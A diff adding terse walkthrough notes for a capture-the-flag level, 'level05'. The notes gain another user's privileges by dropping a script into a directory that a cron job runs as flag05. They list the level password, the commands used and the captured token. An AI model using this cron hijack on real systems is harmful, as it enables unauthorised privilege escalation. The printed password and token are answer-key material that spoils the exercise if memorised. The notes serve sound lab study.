@@ -1,0 +1,11 @@
+- Connect with login: "level05" and password: "ne2searoevaevoem4ov4ar8ap"
+	You have new mail.
+- find / -name mail 2>/dev/null
+- ls /var/mail
+	level05
+- cat /var/mail/level05
+	*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05 <- crontab task every 2 minutes
+- cat /usr/sbin/openarenaserver <- runs every program inside /opt/openarenaserver
+- scp -P 4242 getflag.sh level05@192.168.1.?:/opt/openarenaserver
+- watch cat /tmp/result
+	viuaaale9huek52boumoomioc
